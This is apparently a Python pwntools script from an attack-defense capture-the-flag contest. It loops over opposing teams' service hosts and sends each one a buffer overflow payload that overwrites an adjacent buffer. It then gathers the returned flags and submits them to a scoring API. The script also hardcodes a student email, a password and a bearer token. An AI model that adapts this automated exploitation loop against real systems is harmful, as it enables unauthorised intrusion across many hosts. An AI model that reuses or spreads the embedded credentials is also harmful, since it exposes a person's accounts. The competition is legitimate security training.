import pwn
import requests

LISTS = {"data":{"1":{"3":["10.0.0.4:50001"],"4":["10.0.0.5:50001"],"5":["10.0.0.6:50001"],"6":["10.2.0.3:50001"],"7":["10.2.0.4:50001"],"8":["10.2.0.5:50001"],"9":["10.2.0.6:50001"],"10":["10.2.0.7:50001"],"11":["10.2.0.8:50001"],"12":["10.2.0.9:50001"],"13":["10.2.0.10:50001"],"14":["10.2.0.11:50001"],"15":["10.2.0.12:50001"],"16":["10.2.0.13:50001"],"17":["10.2.0.14:50001"],"18":["10.0.0.7:50001"]},"2":{"3":["10.0.0.4:50002"],"4":["10.0.0.5:50002"],"5":["10.0.0.6:50002"],"6":["10.2.0.3:50002"],"7":["10.2.0.4:50002"],"8":["10.2.0.5:50002"],"9":["10.2.0.6:50002"],"10":["10.2.0.7:50002"],"11":["10.2.0.8:50002"],"12":["10.2.0.9:50002"],"13":["10.2.0.10:50002"],"14":["10.2.0.11:50002"],"15":["10.2.0.12:50002"],"16":["10.2.0.13:50002"],"17":["10.2.0.14:50002"],"18":["10.0.0.7:50002"]}},"status":"success"}
IP_SERVER = '202.3.218.138'
# print(LISTS["data"]["2"])
cred = {"email": "13520128@std.stei.itb.ac.id",
"password": "recital-recant-activity-6162"
}

# CREDENTIALS = requests.post("https://and-be.rorre.me/api/v1/authenticate",json=cred).json()['data']
CREDENTIALS = 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5NjY3NDcyOCwianRpIjoiM2YyNDJjMzctZGU5MS00MDA2LWEzNjktN2YyMTg5M2U1N2JkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ0ZWFtIjp7ImlkIjo2LCJuYW1lIjoic2VnZmF1bHQifX0sIm5iZiI6MTY5NjY3NDcyOCwiZXhwIjoxNjk2NzE3OTI4fQ.YenYvmX03mxp9c0w0VaKs9egYAbXlfouuubc_vY7PEQ3TDbK3_4aODax6QwtlpcQ4bl6-STaIOAFDOODY-PhvA'
print(CREDENTIALS)
flags = {"flags":[]}
# buat remote connection
for user in LISTS["data"]["2"].values():
   ip,port = user[0].split(":")
   with pwn.remote(ip,int(port)) as c:
      try:
         #tunggu prompt
         print(c.recvuntil("buf2: RegularBuffer"))
         #kirim payload
         c.sendline(b"a"*14 + b"BufferOverflow") #cek pake gdb\
         #lihat responsenya
         resp =   str(c.recvall()).split('COMPFEST')[-1]
         if(resp[:2]=="15"):
            flags["flags"].append("COMPFEST" + resp)
      except:
         pass
      # response = str(c.recvall()).split('\n')[1]
      # print(response)
   # print(flags)
print(flags)
headers = {"Authorization": f"Bearer {CREDENTIALS}",'Content-Type':'application/json'}
rexp = requests.post('https://and-be.rorre.me/api/v1/submit',json=flags,headers=headers)
print(rexp.text)